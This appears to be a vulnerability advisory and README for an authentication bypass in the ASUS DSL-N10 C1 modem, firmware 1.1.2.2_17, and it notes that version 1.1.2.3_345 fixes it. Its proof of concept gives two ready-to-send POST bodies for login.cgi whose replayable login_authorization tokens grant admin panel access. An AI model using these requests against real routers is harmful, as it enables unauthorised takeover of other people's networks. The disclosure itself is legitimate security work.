# ASUS DSL N10 Authentication-Bypass

## Title: ASUS-DSL N10 1.1.2.2_17 - Authentication Bypass
Author: AmnBAN team  
Date: 2018-08-06  
Vendor Homepage: https://www.asus.com/Networking/DSLN10_C1_with_5dBi_antenna/  
Sofrware version: 1.1.2.2_17  
CVE: N/A
 
## 1. Description:
In ASUS-DSL N10 C1 modem Firmware Version 1.1.2.2_17 there is login_authorization 
parameter in post data, that use for authorization access to admin panel, 
the data of this parameter is not fully random and you can use old data 
or data of another device to access admin panel.
 
## 2. Proof of Concept:
Browse http://< Your Modem IP >/login.cgi
 
**Send this post data:**  
group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=YWRtaW46MQ%3D%2D
 
**Or this post data:**    
group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=FWRtaW46MQ%3D5D

![Alt text](https://github.com/AmnBAN/ASUS-DSL-N10-Authentication-Bypass/raw/master/asus-dsl-n10-c1-admin-panel-authentication-bypass.gif)  
**Enjoy Admin panel**  

## links:
https://www.exploit-db.com/exploits/45201/

## TODO:
Develop [RouterSploit](https://github.com/threat9/routersploit)  module for this vulnerability.

## Fix:
This issue was fixed in FW 1.1.2.3_345.
